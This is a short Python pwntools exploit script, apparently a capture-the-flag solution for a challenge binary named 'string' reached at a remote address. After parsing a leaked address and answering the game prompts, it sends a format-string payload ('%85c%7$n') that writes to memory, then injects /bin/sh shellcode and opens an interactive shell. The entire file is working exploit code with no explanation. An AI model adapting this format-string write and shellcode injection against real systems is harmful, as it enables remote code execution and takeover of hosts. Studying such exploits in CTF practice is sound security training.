from pwn import *
context(os='linux' , arch = 'amd64' , log_level = 'debug')
#p = process("./string")
p = remote('111.198.29.45',30515)
p.recvuntil("secret[0] is ")
addr = int(p.recvuntil("\n")[:-1],16)
log.success("addr:"+hex(addr))
p.sendlineafter("be:\n","GG")
p.sendlineafter("up?:\n","east")
p.sendlineafter("leave(0)?:\n","1")
p.sendlineafter("address\'\n", str(addr))
p.sendlineafter("is:\n", "%85c%7$n")
shellcode = asm(shellcraft.sh())
#shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"

p.sendlineafter("SPELL\n",shellcode)
sleep(0.1) 
p.interactive() 
